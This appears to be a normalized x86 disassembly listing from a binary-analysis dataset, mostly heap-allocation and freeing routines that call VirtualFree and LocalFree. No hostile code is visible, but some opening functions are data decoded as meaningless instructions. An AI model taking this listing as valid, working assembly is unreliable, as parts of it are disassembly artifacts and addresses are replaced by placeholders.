sub_4010aa
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + esi + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x11 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
int3
add [ eax ] al
inc esi
popfd
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ edx ] dl
inc eax
add [ ecx + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc al [ eax ]
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x57d80040 ] ah
inc eax
add ah ah
push edi
inc eax
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
hlt
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
push eax
adc [ eax ] eax
sub_40117b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403228
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40119f
inc eax
add [ edi - 0x6effbfef ] al
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
popfd
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ edx ] dl
inc eax
add [ ecx + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc al [ eax ]
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x57d80040 ] ah
inc eax
add ah ah
push edi
inc eax
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
hlt
sub_40120d
push edi
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
sar bh 0x25
jb r-xdata
mov al [ 0xffffffff8b004791 ]
sar bh 0x25
pushfd
xchg ecx eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ecx eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg ecx eax
inc edi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_4013a8
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401368
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401400
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a8
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401448
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401400
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401400
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40154c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015b0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401378
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401628
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401430
mov [ rw-data ] 0x1
sub_4016e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401774
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40154c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016e0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401448
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401628
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401430
jmp r-xdata
sub_401884
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016e0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
sub_4019a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401774
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401628
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b8
jmp r-xdata
sub_401a34
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401aea
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401388
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
push 0xff8
push 0x0
call sub_401368
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401af1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401398
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bce
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401390
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_4013a0
retn
push rw-data
call sub_401398
sub_401bd8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c3c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c6c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e40
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cc0
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c9c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd8
add ebx esi
mov [ rw-data ] 0x6
sub_401d58
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c3c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a8
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a8
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c6c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cc0
sub_401e40
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d90
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec8
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c9c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ec8
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d58
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c6c
sub [ edi + 0x4 ] 0x4
sub_401fa0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017f4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fcc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401884
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402000
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40202c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e40
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401fa0
test al al
jne r-xdata
mov eax esi
call sub_402000
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402120
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a34
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40229c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401390
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40202c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401398
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039d4
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
